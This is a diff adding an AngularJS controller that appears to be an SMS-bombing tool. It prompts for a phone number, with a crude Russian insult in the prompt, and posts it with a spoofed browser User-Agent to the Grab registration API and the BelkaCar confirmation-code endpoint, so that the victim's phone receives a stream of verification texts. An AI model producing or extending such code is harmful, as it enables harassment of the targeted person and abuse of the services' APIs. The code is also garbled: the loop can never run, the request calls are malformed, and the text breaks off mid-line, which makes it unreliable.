@@ -1,0 +1,13 @@
+angular.module("app", [])
+  .controller("MainCtrl", function ($scope) {
+    $scope.heading = "AngularJS";
+    var i =0
+    while (i>1){
+      var _phone=prompt('номер введи ебалай' ,"79xxxx")
+      var headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}
+      $post("https://p.grabtaxi.com/api/passenger/v2/profiles/register", {'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'} , headers);
+            then(function success(response) {
+                console.log('grabtaxi send');
+          });
+        $post('https://belkacar.ru/get-confirmation-code' , { "phone":_phone }, headers);
+        then(fun
